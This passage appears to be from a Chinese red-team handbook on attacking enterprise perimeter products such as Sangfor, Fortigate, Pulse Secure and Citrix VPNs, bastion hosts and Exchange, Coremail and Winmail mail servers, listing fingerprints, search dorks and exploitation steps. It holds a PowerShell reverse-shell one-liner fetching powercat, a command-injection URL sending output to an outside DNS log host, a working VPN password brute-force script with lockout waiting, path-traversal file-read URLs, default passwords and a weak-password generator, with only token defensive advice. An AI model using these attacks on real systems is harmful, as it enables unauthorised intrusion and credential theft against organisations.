可以直接使用powershell进行反弹shell\npowershell IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c vps_ip -p 6666 -e cmd\n8. 防护方法\n1.及时更新补丁\n2.使用waf拦截\nSmartbi 前台SQL注入 1. 漏洞简介\nSmartbi /vision/RMIServlet 接口存在SQL注入, 无需身份认证的攻击者可利用该漏洞查看数据库中的敏感信息或删除任意用户.\n2. 影响组件 Smartbi\n3. 漏洞指纹\nSmartBi\n4. Fofa Dork\napp=\u0026quot;Smartbi\u0026quot;\n5. 漏洞分析\nSmartbi软件SQL注入漏洞安全修复通报（厂商已修复） https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ\n漏洞文件 vision/userListManager.jsp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 function doDel(){ var ids = []; // 全选 if($(\u0026#34;#checkAll\u0026#34;).checked){ if(curRows){ curRows.forEach(function(val, index){ ids.push(val.id); }); } }else{ if(curRows){ $(\u0026#34;[name=\u0026#39;checkTr\u0026#39;]\u0026#34;).each(function(){ if(this.checked){ ids.push(this.id); } }); } } if(ids \u0026amp;\u0026amp; ids.length \u0026gt; 0){ if(!canOpt()){ alert(\u0026#34;\u0026lt;%=StringUtil.getLanguageValue(\u0026#34;Youdonothavepermissiontodoso\u0026#34;)%\u0026gt;\u0026#34;); return; } var msg = \u0026#34;\u0026lt;%=StringUtil.getLanguageValue(\u0026#34;Suredelete?\u0026#34;)%\u0026gt;\u0026#34;; var flags = modalWindow.MB_YESNO | modalWindow.MB_ICONQUESTION; alert(msg, \u0026#34;\u0026lt;%=StringUtil.getLanguageValue(\u0026#34;Removetips\u0026#34;)%\u0026gt;\u0026#34;, flags, function(ret) { if (ret == modalWindow.ID_YES) { var ret = jsloader.resolve(\u0026#34;freequery.common.util\u0026#34;).remoteInvokeEx2(\u0026#34;BIConfigService\u0026#34;, \u0026#34;delUsers\u0026#34;, [ids]); if(ret \u0026amp;\u0026amp; ret.result == 1){ alert(\u0026#34;\u0026lt;%=StringUtil.getLanguageValue(\u0026#34;Deletedsuccessfully\u0026#34;)%\u0026gt;\u0026#34;); refresh(); } } }, this); }else{ alert(\u0026#34;\u0026lt;%=StringUtil.getLanguageValue(\u0026#34;Noselectedobjectyouwanttodelete\u0026#34;)%\u0026gt;\u0026#34;); } } smartbi/WEB-INF/lib/smartbi-BIConfig.jar!/smartbi/config/BIConfigService.class\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 public int delUsers(List\u0026lt;String\u0026gt; ids) { boolean succ = true; String idStr = \u0026#34;\u0026#34;; if (ids != null \u0026amp;\u0026amp; ids.size() \u0026gt; 0) { for(int i = 0; i \u0026lt; ids.size(); ++i) { if (i == 0) { idStr = \u0026#34;(\u0026#39;\u0026#34; + (String)ids.get(i) + \u0026#34;\u0026#39;\u0026#34;; } else { idStr = idStr + \u0026#34;, \u0026#34; + \u0026#34;\u0026#39;\u0026#34; + (String)ids.get(i) + \u0026#34;\u0026#39;\u0026#34;; } } idStr = idStr + \u0026#34;)\u0026#34;; Connection conn = null; PreparedStatement prep = null; Object rs = null; try { conn = DbUtil.getRepoConnection(); conn.setAutoCommit(false); String sqlUser = \u0026#34;delete from t_user where c_userid in \u0026#34; + idStr; String sqlUserAttr = \u0026#34;delete from t_userattr where c_userid in \u0026#34; + idStr; String sqlUserconfig = \u0026#34;delete from t_userconfig where c_userid in \u0026#34; + idStr; String sqlUserRole = \u0026#34;delete from t_user_role where c_userid in \u0026#34; + idStr; String sqlUserGroup = \u0026#34;delete from t_group_user where c_userid in \u0026#34; + idStr; prep = conn.prepareStatement(sqlUser); prep.execute(); prep = conn.prepareStatement(sqlUserAttr); prep.execute(); prep = conn.prepareStatement(sqlUserconfig); prep.execute(); prep = conn.prepareStatement(sqlUserRole); prep.execute(); prep = conn.prepareStatement(sqlUserGroup); prep.execute(); conn.commit(); } catch (Exception var17) { try { succ = false; conn.rollback(); } catch (SQLException var16) { throw new SmartbiException(ConfigErrorCode.DELETE_FAILED, var17); } throw new SmartbiException(ConfigErrorCode.DELETE_FAILED, var17); } finally { DbUtil.closeDBObject((ResultSet)rs, prep, conn); } return succ ? 1 : 0; } else { return 1; } } 6. 漏洞利用\n这里是delete 注入, 不建议使用, 没看到有公开的利用信息, 就不写EXP了\n7. 利用技巧\n1.RMIServlet加解密代码\n虽然利用不能写EXP, 这里写一个RMIServlet 的加解密代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 ENCODING_SCHEDULE = { \u0026#34;0\u0026#34;: \u0026#34;7\u0026#34;, \u0026#34;1\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;2\u0026#34;: \u0026#34;u\u0026#34;, \u0026#34;3\u0026#34;: \u0026#34;N\u0026#34;, \u0026#34;4\u0026#34;: \u0026#34;K\u0026#34;, \u0026#34;5\u0026#34;: \u0026#34;J\u0026#34;, \u0026#34;6\u0026#34;: \u0026#34;M\u0026#34;, \u0026#34;7\u0026#34;: \u0026#34;9\u0026#34;, \u0026#34;8\u0026#34;: \u0026#34;\u0026#39;\u0026#34;, \u0026#34;9\u0026#34;: \u0026#34;m\u0026#34;, \u0026#34;!\u0026#34;: \u0026#34;P\u0026#34;, \u0026#34;%\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;\u0026#39;\u0026#34;: \u0026#34;n\u0026#34;, \u0026#34;(\u0026#34;: \u0026#34;A\u0026#34;, \u0026#34;)\u0026#34;: \u0026#34;E\u0026#34;, \u0026#34;*\u0026#34;: \u0026#34;s\u0026#34;, \u0026#34;+\u0026#34;: \u0026#34;+\u0026#34;, \u0026#34;-\u0026#34;: \u0026#34;f\u0026#34;, \u0026#34;.\u0026#34;: \u0026#34;q\u0026#34;, \u0026#34;A\u0026#34;: \u0026#34;O\u0026#34;, \u0026#34;B\u0026#34;: \u0026#34;V\u0026#34;, \u0026#34;C\u0026#34;: \u0026#34;t\u0026#34;, \u0026#34;D\u0026#34;: \u0026#34;T\u0026#34;, \u0026#34;E\u0026#34;: \u0026#34;a\u0026#34;, \u0026#34;F\u0026#34;: \u0026#34;x\u0026#34;, \u0026#34;G\u0026#34;: \u0026#34;H\u0026#34;, \u0026#34;H\u0026#34;: \u0026#34;r\u0026#34;, \u0026#34;I\u0026#34;: \u0026#34;c\u0026#34;, \u0026#34;J\u0026#34;: \u0026#34;v\u0026#34;, \u0026#34;K\u0026#34;: \u0026#34;l\u0026#34;, \u0026#34;L\u0026#34;: \u0026#34;8\u0026#34;, \u0026#34;M\u0026#34;: \u0026#34;F\u0026#34;, \u0026#34;N\u0026#34;: \u0026#34;3\u0026#34;, \u0026#34;O\u0026#34;: \u0026#34;o\u0026#34;, \u0026#34;P\u0026#34;: \u0026#34;L\u0026#34;, \u0026#34;Q\u0026#34;: \u0026#34;Y\u0026#34;, \u0026#34;R\u0026#34;: \u0026#34;j\u0026#34;, \u0026#34;S\u0026#34;: \u0026#34;W\u0026#34;, \u0026#34;T\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;U\u0026#34;: \u0026#34;z\u0026#34;, \u0026#34;V\u0026#34;: \u0026#34;Z\u0026#34;, \u0026#34;W\u0026#34;: \u0026#34;!\u0026#34;, \u0026#34;X\u0026#34;: \u0026#34;B\u0026#34;, \u0026#34;Y\u0026#34;: \u0026#34;)\u0026#34;, \u0026#34;Z\u0026#34;: \u0026#34;U\u0026#34;, \u0026#34;a\u0026#34;: \u0026#34;(\u0026#34;, \u0026#34;b\u0026#34;: \u0026#34;~\u0026#34;, \u0026#34;c\u0026#34;: \u0026#34;i\u0026#34;, \u0026#34;d\u0026#34;: \u0026#34;h\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;p\u0026#34;, \u0026#34;f\u0026#34;: \u0026#34;_\u0026#34;, \u0026#34;g\u0026#34;: \u0026#34;-\u0026#34;, \u0026#34;h\u0026#34;: \u0026#34;I\u0026#34;, \u0026#34;i\u0026#34;: \u0026#34;R\u0026#34;, \u0026#34;j\u0026#34;: \u0026#34;.\u0026#34;, \u0026#34;k\u0026#34;: \u0026#34;G\u0026#34;, \u0026#34;l\u0026#34;: \u0026#34;S\u0026#34;, \u0026#34;m\u0026#34;: \u0026#34;d\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;6\u0026#34;, \u0026#34;o\u0026#34;: \u0026#34;w\u0026#34;, \u0026#34;p\u0026#34;: \u0026#34;5\u0026#34;, \u0026#34;q\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;r\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;s\u0026#34;: \u0026#34;D\u0026#34;, \u0026#34;t\u0026#34;: \u0026#34;k\u0026#34;, \u0026#34;u\u0026#34;: \u0026#34;Q\u0026#34;, \u0026#34;v\u0026#34;: \u0026#34;g\u0026#34;, \u0026#34;w\u0026#34;: \u0026#34;b\u0026#34;, \u0026#34;x\u0026#34;: \u0026#34;C\u0026#34;, \u0026#34;y\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;X\u0026#34;, \u0026#34;~\u0026#34;: \u0026#34;e\u0026#34;, \u0026#34;_\u0026#34;: \u0026#34;y\u0026#34;, } DECODING_SCHEDULE = { \u0026#34;7\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;1\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;u\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;N\u0026#34;: \u0026#34;3\u0026#34;, \u0026#34;K\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;J\u0026#34;: \u0026#34;5\u0026#34;, \u0026#34;M\u0026#34;: \u0026#34;6\u0026#34;, \u0026#34;9\u0026#34;: \u0026#34;7\u0026#34;, \u0026#34;\u0026#39;\u0026#34;: \u0026#34;8\u0026#34;, \u0026#34;m\u0026#34;: \u0026#34;9\u0026#34;, \u0026#34;P\u0026#34;: \u0026#34;!\u0026#34;, \u0026#34;/\u0026#34;: \u0026#34;%\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;\u0026#39;\u0026#34;, \u0026#34;A\u0026#34;: \u0026#34;(\u0026#34;, \u0026#34;E\u0026#34;: \u0026#34;)\u0026#34;, \u0026#34;s\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;+\u0026#34;: \u0026#34;+\u0026#34;, \u0026#34;f\u0026#34;: \u0026#34;-\u0026#34;, \u0026#34;q\u0026#34;: \u0026#34;.\u0026#34;, \u0026#34;O\u0026#34;: \u0026#34;A\u0026#34;, \u0026#34;V\u0026#34;: \u0026#34;B\u0026#34;, \u0026#34;t\u0026#34;: \u0026#34;C\u0026#34;, \u0026#34;T\u0026#34;: \u0026#34;D\u0026#34;, \u0026#34;a\u0026#34;: \u0026#34;E\u0026#34;, \u0026#34;x\u0026#34;: \u0026#34;F\u0026#34;, \u0026#34;H\u0026#34;: \u0026#34;G\u0026#34;, \u0026#34;r\u0026#34;: \u0026#34;H\u0026#34;, \u0026#34;c\u0026#34;: \u0026#34;I\u0026#34;, \u0026#34;v\u0026#34;: \u0026#34;J\u0026#34;, \u0026#34;l\u0026#34;: \u0026#34;K\u0026#34;, \u0026#34;8\u0026#34;: \u0026#34;L\u0026#34;, \u0026#34;F\u0026#34;: \u0026#34;M\u0026#34;, \u0026#34;3\u0026#34;: \u0026#34;N\u0026#34;, \u0026#34;o\u0026#34;: \u0026#34;O\u0026#34;, \u0026#34;L\u0026#34;: \u0026#34;P\u0026#34;, \u0026#34;Y\u0026#34;: \u0026#34;Q\u0026#34;, \u0026#34;j\u0026#34;: \u0026#34;R\u0026#34;, \u0026#34;W\u0026#34;: \u0026#34;S\u0026#34;, \u0026#34;*\u0026#34;: \u0026#34;T\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;U\u0026#34;, \u0026#34;Z\u0026#34;: \u0026#34;V\u0026#34;, \u0026#34;!\u0026#34;: \u0026#34;W\u0026#34;, \u0026#34;B\u0026#34;: \u0026#34;X\u0026#34;, \u0026#34;)\u0026#34;: \u0026#34;Y\u0026#34;, \u0026#34;U\u0026#34;: \u0026#34;Z\u0026#34;, \u0026#34;(\u0026#34;: \u0026#34;a\u0026#34;, \u0026#34;~\u0026#34;: \u0026#34;b\u0026#34;, \u0026#34;i\u0026#34;: \u0026#34;c\u0026#34;, \u0026#34;h\u0026#34;: \u0026#34;d\u0026#34;, \u0026#34;p\u0026#34;: \u0026#34;e\u0026#34;, \u0026#34;_\u0026#34;: \u0026#34;f\u0026#34;, \u0026#34;-\u0026#34;: \u0026#34;g\u0026#34;, \u0026#34;I\u0026#34;: \u0026#34;h\u0026#34;, \u0026#34;R\u0026#34;: \u0026#34;i\u0026#34;, \u0026#34;.\u0026#34;: \u0026#34;j\u0026#34;, \u0026#34;G\u0026#34;: \u0026#34;k\u0026#34;, \u0026#34;S\u0026#34;: \u0026#34;l\u0026#34;, \u0026#34;d\u0026#34;: \u0026#34;m\u0026#34;, \u0026#34;6\u0026#34;: \u0026#34;n\u0026#34;, \u0026#34;w\u0026#34;: \u0026#34;o\u0026#34;, \u0026#34;5\u0026#34;: \u0026#34;p\u0026#34;, \u0026#34;0\u0026#34;: \u0026#34;q\u0026#34;, \u0026#34;4\u0026#34;: \u0026#34;r\u0026#34;, \u0026#34;D\u0026#34;: \u0026#34;s\u0026#34;, \u0026#34;k\u0026#34;: \u0026#34;t\u0026#34;, \u0026#34;Q\u0026#34;: \u0026#34;u\u0026#34;, \u0026#34;g\u0026#34;: \u0026#34;v\u0026#34;, \u0026#34;b\u0026#34;: \u0026#34;w\u0026#34;, \u0026#34;C\u0026#34;: \u0026#34;x\u0026#34;, \u0026#34;2\u0026#34;: \u0026#34;y\u0026#34;, \u0026#34;X\u0026#34;: \u0026#34;z\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;~\u0026#34;, \u0026#34;y\u0026#34;: \u0026#34;_\u0026#34;, } #此函数可以用来加密明文也可以解密服务器返回的密文 def encode(code): out = \u0026#34;\u0026#34; for item in code: out = out + ENCODING_SCHEDULE.get(item, item) return out def decode(code): out = \u0026#34;\u0026#34; for item in code: out = out + DECODING_SCHEDULE.get(item, item) return out 2.该系统还有几处漏洞, 比如默认口令\n1 2 3 4 5 6 7 8 9 demo/demo manager/demo admin/admin admin/manager admin/2manager 3.默认路径\nhttp://127.0.0.1:18080/smartbi/vision/config.jsp 可能未修改密码或者密码为manager\n4.进入后台目录遍历\nhttp://127.0.0.1:18080/smartbi/vision/chooser.jsp?key=CONFIG_FILE_DIR\u0026amp;root=C%3A%2F\n同样是后台可以加载插件, 怎么getshell不用我多说了吧\n8. 防护方法\n1.及时更新补丁\n2.使用强口令\n3.版本最好为最新版8.5以上, v7还有其他漏洞\n第二节 本节主要是针对网络边界产品, VPN, 防火墙, 邮箱一类的相关漏洞, 属于典型灯下黑的情况, 厂商可能会忘记, 但是攻击者不会放过一丝一毫\n深信服VPN远程代码执行 1. 漏洞简介\n深信服 VPN 某个特定产品存在远程代码执行, 2019 攻防演练使用过\n2. 影响组件 深信服 VPN\n3. 漏洞指纹\nSet-Cookie: TWFID=\nwelcome to ssl vpn\nSinfor\n4. Fofa Dork\nheader=\u0026quot;Set-Cookie: TWFID=\u0026quot;\n5. 漏洞分析\n深信服vpnweb登录逆向学习 – potatso – 博客园 https://www.cnblogs.com/potatsoSec/p/12326356.html\n6. 漏洞利用\nwget -t %d -T %d --spider %s\n1 https:/123.123.123.123/por/checkurl.csp?timeout=3\u0026amp;retry=0\u0026amp;url=http://admin.ceye.io/`uname` 7. 利用技巧\n1.该版本深信服VPN属于相对早期的版本, 大概2008年左右, 但目前还有761个ip开放在公网\n2.该版本较低, whomai不存在, 可以使用 uname, 这里没有空格可dns传出来\n3.去除空格也简单 cat /etc/passwd | tr \u0026quot; \\n\u0026quot; \u0026quot;+|\u0026quot;\n8. 防护方法\n1.及时更新补丁\n2.升级到最新版\n深信服 VPN 口令爆破 1. 漏洞简介\n深信服 VPN 针对口令爆破是5次错误锁定IP五分钟, 所以这里爆破也不是不行, 主要是测试常见弱口令以及分布式爆破也不是不行\n2. 影响组件 深信服 VPN\n3. 漏洞指纹\n/por/login_auth.csp?apiversion=1\nsangfor\n/cgi-bin/login.cgi?rnd=\n4. Fofa Dork\napp=\u0026quot;深信服-SSL-VPN\u0026quot;\n5. 漏洞分析\n关于SSL VPN认证时的验证码绕过 – SSL VPN/EMM – 深信服社区 https://bbs.sangfor.com.cn/forum.php?mod=viewthread\u0026tid=20633\n此处存疑, 时间问题没有测试\n6. 漏洞利用\n1.深信服VPN 口令爆破 demo (这里仅测试了M6,其他的应该差不多)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #encoding=utf8 import requests import hashlib import urllib3 urllib3.disable_warnings() import re session = requests.session() def SanForLogin(target, password, username=\u0026#34;admin\u0026#34;): burp0_url = target +\u0026#34;/cgi-bin/login.cgi?rnd=\u0026#34; burp0_headers = {\u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\u0026#34;} r1 = session.get(burp0_url, verify=False) sid = r1.cookies[\u0026#34;sinfor_session_id\u0026#34;] Epassword = hashlib.sha1(password+sid).hexdigest() burp0_data = {\u0026#34;user\u0026#34;: username, \u0026#34;password\u0026#34;: Epassword, \u0026#34;logintime\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;program\u0026#34;: \u0026#34;3\u0026#34;, \u0026#34;language\u0026#34;: \u0026#34;zh_CN\u0026#34;} r2 = session.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False) r2.encoding=\u0026#34;UTF-8\u0026#34; if r2.status_code==200 and \u0026#34;\u0026lt;TITLE\u0026gt;Loading...\u0026lt;/TITLE\u0026gt;\u0026#34; in r2.text: print(\u0026#34;Success! admin password is \u0026#34;, password) print(r2.cookies[\u0026#34;sinfor_session_id\u0026#34;]) return password else: for x in re.findall(\u0026#34;var loginInfo = \\\u0026#34;.*?\\\u0026#34;\u0026#34;, r2.text): print(x) if \u0026#34;IP\u0026#34; in x: print(\u0026#34;IP lock wait for 5 mins\u0026#34;) time.sleep(305) SanForLogin(\u0026#34;https://xxxxxxxxxxx/\u0026#34;, \u0026#34;admin\u0026#34;) 7. 利用技巧\n1.由于深信服涉及的版本跨度时间达十几年, 很多地方不一样, 但是总体都差不太多\n国外APT组织应该也批量爆破了一波\n加密的密码也就是 sha1(password+sid)\n爆破也就锁一会ip, 夜里丢一边跑着就完事了, 弱口令也就那么些\nadmin/123456/Sangfor/Sangfor@123\n2.如果爆破出来了管理员密码, 管理员后台有好多处命令注入, 比如升级工具, 这里讲起来应该是正常功能\n3.去年传闻还有前台sql注入, 但是没拿到补丁, 手头没环境, 就没分析, 看一下乌云上的老洞吧\n深信服SSL VPN外置数据中心敏感信息泄漏\u0026amp;SQL注入漏洞可导致getshell – 体验盒子 – 关注网络安全 https://www.uedbox.com/post/31092/\n8. 防护方法\n1.及时更新补丁\n2.升级到最新版\nFortigate SSL VPN 文件读取/远程代码执行 1. 漏洞简介\nFortigate SSL VPN 在全球用户量巨大, 去年橘子哥发现了文件读取和远程代码执行漏洞\n2. 影响组件 Fortigate SSL VPN\n3. 漏洞指纹\nFortigate\n4tinet2095866\n4. Fofa Dork\n\u0026quot;Fortigate\u0026quot; \u0026amp;\u0026amp; port=10443\n5. 漏洞分析\nOrange: Attacking SSL VPN – Part 2: Breaking the Fortigate SSL VPN https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html?m=1\n6. 漏洞利用\n密码读取\nmilo2012/CVE-2018-13379: CVE-2018-13379 https://github.com/milo2012/CVE-2018-13379\n任意密码重置, 这肯定是个后门\nmilo2012/CVE-2018-13382: CVE-2018-13382 https://github.com/milo2012/CVE-2018-13382\n7. 利用技巧\n1.文件读取的路径构造\nhttps://xxxxxx:10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession\n如下padding可以构造出来任意文件读取, 可以读取其他文件, 注意这个系统好像没有/etc/passwd\nprint(\u0026quot;/../../../../\u0026quot;+(raw_input().rjust(35, '/')))\n2.寻找魔术数字\n虽然当时橘子哥没有公开魔术数字, 但是当时随手分析了一下下面这个启动文件, 搜索一下magic就找到 4tinet2095866,\nhttps://xxxxxxxx:10443/remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd\n后来发现这个字符串在js里面也有, 直接从前台分析也可以获得\nhttps://xxxxx:10443/sslvpn/js/login.js?q=5f9a6877fd1f78da768239aae6e739c2\n8. 防护方法\n1.及时更新补丁\n2.升级到最新版\nPulse Secure SSL VPN远程代码执行漏洞 1. 漏洞简介\nPulse Secure SSL VPN 在全球用户量巨大, 去年橘子哥发现了很多漏洞\n2. 影响组件\nPulse Secure SSL VPN\n3. 漏洞指纹\nPulse Secure SSL VPN\n4. Fofa Dork\napp=\u0026quot;PulseSecure-SSL-VPN\u0026quot;\n5. 漏洞分析\nPulse Secure SSL VPN远程代码执行漏洞利用与分析 – 安全客, 安全资讯平台 https://www.anquanke.com/post/id/185773\n6. 漏洞利用\nprojectzeroindia/CVE-2019-11510: Exploit for Arbitrary File Read on Pulse Secure SSL VPN (CVE-2019-11510) https://github.com/projectzeroindia/CVE-2019-11510\n0xDezzy/CVE-2019-11539: Exploit for the Post-Auth RCE vulnerability in Pulse Secure Connect https://github.com/0xDezzy/CVE-2019-11539\n7. 利用技巧\n8. 防护方法\n1.及时更新补丁\n2.升级到最新版\nPalo Alto GlobalProtect VPN远程代码执行漏洞 1. 漏洞简介\nPalo Alto GlobalProtect 在全球用户量巨大, 去年橘子哥发现了很多漏洞\n2. 影响组件 Palo Alto GlobalProtect\n3. 漏洞指纹\nGlobalProtect Portal\n4. Fofa Dork\napp=\u0026quot;PaloAlto-GlobalProtect\u0026quot;\n5. 漏洞分析\nOrange: Attacking SSL VPN – Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study! https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html\nPalo Alto GlobalProtect上的PreAuth RCE – 渗透测试中心 – 博客园 https://www.cnblogs.com/backlion/p/11209054.html\n6. 漏洞利用\nsecurifera/CVE-2019-1579 https://github.com/securifera/CVE-2019-1579\n7. 利用技巧\n1.这个扫描的话可以判断\n/global-protect/portal/css/login.css /images/logo_pan_158.gif\nLast-Modified 是否早于于2018年\ncurl -s -I https://sslvpn/global-protect/portal/css/login.css | grep Last-Modified\nLast-Modified: Sun, 10 Sep 2017 16:48:23 GMT\n8. 防护方法\n1.及时更新补丁\n2.升级到最新版\nCitrix Gateway/ADC 远程代码执行漏洞 (CVE-2019-19781) 1. 漏洞简介\nCitrix Gateway/ADC 在全球拥有很多的大客户. 这也是个很经典的灯下黑漏洞(后门)\n2. 影响组件\nCitrix Gateway/ADC\n3. 漏洞指纹\nCitrix Gateway/ADC\n4. Fofa Dork\napp=\u0026quot;Citrix-Netscaler\u0026quot;\n5. 漏洞分析\nCitrix Gateway/ADC 远程代码执行漏洞分析 – FreeBuf互联网安全新媒体平台 https://www.freebuf.com/news/232752.html\n6. 漏洞利用\ntrustedsec/cve-2019-19781: This is a tool published for the Citrix ADC (NetScaler) vulnerability. We are only disclosing this due to others publishing the exploit code first. https://github.com/trustedsec/cve-2019-19781\n7. 利用技巧\n1.通过以下命令可以快速断定\ncurl https://host/vpn/../vpns/cfg/smb.conf --path-as-is --insecure\n这里部分版本不需要进行../跳转也可以, 具体原因没有分析\n8. 防护方法\n1.及时更新补丁\n2.升级到最新版\n3.暂时屏蔽未授权用户对/vpns/路径的访问\n齐治堡垒机相关漏洞 1. 漏洞简介\n齐治堡垒机是国内使用比较多的堡垒机产品, 后端使用PHP编写\n2. 影响组件 齐治堡垒机\n3. 漏洞指纹\nshterm\n4. Fofa Dork\napp=\u0026quot;shterm-堡垒机\u0026quot;\n5. 漏洞分析\n审计某系统从解密到GetShell – 云+社区 – 腾讯云 https://cloud.tencent.com/developer/article/1448700\n齐治堡垒机远程命令执行漏洞（CNVD-2019-20835）分析 – 开发笔记 http://kfbiji.com/article/65b98114903248eb\n6. 漏洞利用\n齐治堡垒机远程命令执行漏洞（CNVD-2019-20835）分析 – 开发笔记 http://kfbiji.com/article/65b98114903248eb\n7. 利用技巧\n1.齐治堡垒机默认口令:shterm/shterm\n2.普通用户获取堡垒机权限, 登录之后可尝试命令注入\n如果有类似chrome的应用可以直接使用ctrl+o打开窗口, 然后新建bat, 起一个cmd或者其他的程序\n8. 防护方法\n1.及时更新补丁\n2.升级到最新版\n3.做好权限控制\nExchange 相关漏洞 1. 漏洞简介\nExchange 是企业用量很大的邮件服务器, 包括一个登录后用户伪造(CVE-2018-8581, 利用难度高)和登录后反序列化漏洞(CVE-2020-0688, 利用难度低)\n2. 影响组件 Exchange\n3. 漏洞指纹\nExchange\noutlook\n4. Fofa Dork\napp=\u0026quot;Microsoft-Exchange\u0026quot;\n5. 漏洞分析\n微软Exchange爆出0day漏洞, 来看POC和技术细节 – FreeBuf互联网安全新媒体平台 https://www.freebuf.com/vuls/195162.html\nMicrosoft Exchange 任意用户伪造漏洞（CVE-2018-8581）分析 https://paper.seebug.org/804/\n微软Exchange服务器远程代码执行漏洞复现分析[CVE-2020-0688] – 先知社区 https://xz.aliyun.com/t/7299\n6. 漏洞利用\nRidter/Exchange2domain: CVE-2018-8581 https://github.com/Ridter/Exchange2domain\nRidter/cve-2020-0688: cve-2020-0688 https://github.com/Ridter/cve-2020-0688\npwntester/ysoserial.net: Deserialization payload generator for a variety of .NET formatters https://github.com/pwntester/ysoserial.net\n7. 利用技巧\n1.寻找企业的Exchange有个技巧\n除了访问以下域名或者直接查找 DNS MX 记录\n1 2 3 4 5 6 7 mail.domain.com mail1.domain.com mail-hk.domain.com owa.domain.com exchange.domain.com email.domain.com outlook.domain.com 还有个很好用的域名, 这是outlook的自动发现域名\nautodiscover.domain.com\n2.爆破Exchange\n这里两个漏洞都需要登录, 其实这个的弱口令不是很难找, 经常会成为企业的突破口\n通常这里的密码能横穿内网, 比如 VPN, OA, SSO\nExchange通常有以下几个接口\n/owa 前台web登录, 一般可以爆破\n/ews 这里是ews的接口, 可以进行401认证爆破, 只需要(域)账号和密码, 不需要知道域名前缀, 更方便爆破\n/autodiscover/autodiscover.xml 自动发现接口, 同ews爆破\n3.爆破工具可使用 owa用burp, ews用ruler, awvs(比较好用)\nsensepost/ruler: A tool to abuse Exchange services https://github.com/sensepost/ruler\n4.弱口令爆破技巧, 爆破Exchange相对比较好用, 直接生成企业特色弱口令\n1 2 3 4 5 6 7 8 9 10 11 12 import itertools prefix = [\u0026#39;baidu\u0026#39;, \u0026#39;Baidu\u0026#39;] for x in [\u0026#39;\u0026#39;.join(x) for x in list(itertools.product(prefix, [\u0026#39;@\u0026#39;, \u0026#39;\u0026#39;], [\u0026#39;2019\u0026#39;, \u0026#39;2020\u0026#39;, \u0026#39;2018\u0026#39;, \u0026#39;123\u0026#39;, \u0026#39;1234\u0026#39;, \u0026#39;123456\u0026#39;], [\u0026#39;!\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;.\u0026#39;]))] : print(x) baidu@2019! baidu@2019 baidu@2019. baidu@2020! baidu@2020 ......... Baidu123456 Baidu123456. 8. 防护方法\n1.及时更新补丁\n2.升级到最新版\n3.做好权限控制\nCoremail 相关漏洞 1. 漏洞简介\nCoremail 是国内使用量很大的邮件服务商, 包括网易邮箱的后端使用的也是coremail\n2. 影响组件 Coremail\n3. 漏洞指纹\nCoremail\n4. Fofa Dork\napp=\u0026quot;Coremail\u0026quot;\n5. 漏洞分析 Coremail-0day敏感文件泄露漏洞送附批量检测脚本_数据库_god_Zeo的博客-CSDN博客 https://blog.csdn.net/god_zzZ/article/details/92735189\n6. 漏洞利用\nyuxiaoyou123/coremail-exp https://github.com/yuxiaoyou123/coremail-exp\ndpu/coremail-address-book: Coremail邮件系统组织通讯录导出脚本 https://github.com/dpu/coremail-address-book\n7. 利用技巧\n1.这个找不到源码, 没法分析\n里面的密码也多半没啥用, 还不如邮件里搜索一下vpn/密码\n2.这个东西有几率收到ImageMagick影响(此处存疑, 我只在dnslog见过, 没有实锤)\n8. 防护方法\n1.及时更新补丁\n2.升级到最新版\nWinmail 相关漏洞 1. 漏洞简介\nWinmail 是国内使用量较大的邮件服务商, 由于版本老旧, 有一些历史漏洞, 注入, 任意文件下载, 上传\n2. 影响组件 Winmail\n3. 漏洞指纹\nWinmail\n4. Fofa Dork\napp=\u0026quot;Winmail-Server\u0026quot;\n5. 漏洞分析\nWinmail最新直达webshell 0day漏洞挖掘实录_91Ri.org http://www.91ri.org/16519.html\nwinmail过滤不严getshell+任意文件下载(需要登录邮箱）_黑客技术 http://www.hackdig.com/06/hack-36899.htm\nWinmail普通用户可直接进入后台取得域名管理、用户管理等所有权限 | WooYun-2014-57890 | WooYun.org https://php.mengsec.com/bugs/wooyun-2014-057890.html\n6. 漏洞利用\nWinmail最新直达webshell 0day漏洞挖掘实录_91Ri.org http://www.91ri.org/16519.html\nwinmail过滤不严getshell+任意文件下载(需要登录邮箱）_黑客技术 http://www.hackdig.com/06/hack-36899.htm\nWinmail普通用户可直接进入后台取得域名管理、用户管理等所有权限 | 